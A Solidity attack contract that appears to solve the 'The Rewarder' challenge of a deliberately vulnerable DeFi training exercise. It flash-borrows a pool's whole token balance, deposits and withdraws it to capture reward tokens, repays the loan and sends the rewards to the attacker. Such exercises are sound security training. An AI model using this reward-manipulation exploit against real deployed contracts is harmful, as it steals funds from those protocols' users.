// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {
    uint256 amountDVT;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    address attacker;

    constructor(
        FlashLoanerPool _flashLoanPool,
        TheRewarderPool _rewarderPool,
        DamnValuableToken _liquidityToken,
        RewardToken _rewardToken
    ) {
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        attacker = msg.sender;
    }

    function attack() external {
        amountDVT = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amountDVT);
    }

    function receiveFlashLoan(uint256) external payable {
        liquidityToken.approve(address(rewarderPool), amountDVT);
        rewarderPool.deposit(amountDVT);
        rewarderPool.withdraw(amountDVT);
        liquidityToken.transfer(address(flashLoanPool), amountDVT);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
